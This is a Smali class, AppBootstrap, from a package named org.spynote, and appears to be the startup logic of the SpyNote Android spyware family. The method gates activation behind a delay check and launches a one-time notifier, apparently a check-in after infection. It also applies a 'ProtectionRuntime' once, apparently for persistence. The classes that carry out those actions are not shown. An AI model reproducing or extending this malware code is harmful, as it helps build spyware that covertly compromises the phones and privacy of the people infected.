.class public Lorg/spynote/AppBootstrap;
.super Ljava/lang/Object;
.source "AppBootstrap.java"


.method public static onStart(Landroid/content/Context;)V
    .locals 4

    if-nez p0, :cond_0
    return-void

    :cond_0
    :try_start_0
    invoke-static {p0}, Lorg/spynote/DelayGate;->registerEvents(Landroid/content/Context;)V

    invoke-static {p0}, Lorg/spynote/DelayGate;->canActivate(Landroid/content/Context;)Z
    move-result v0
    if-nez v0, :cond_1
    return-void

    :cond_1
    const-string v0, "spynote_notify_v2"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const-string v2, "sent"
    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    if-nez v0, :cond_2

    new-instance v0, Lorg/spynote/NotifyWorker;
    invoke-direct {v0, p0}, Lorg/spynote/NotifyWorker;-><init>(Landroid/content/Context;)V
    invoke-virtual {v0}, Lorg/spynote/NotifyWorker;->start()V

    :cond_2
    const-string v0, "spynote_bootstrap_v1"
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const-string v2, "protection_done"
    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v3
    if-nez v3, :cond_3

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
    move-result-object v0
    const-string v2, "protection_done"
    const/4 v3, 0x1
    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;
    move-result-object v0
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-static {p0}, Lorg/spynote/ProtectionRuntime;->apply(Landroid/content/Context;)V

    :cond_3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
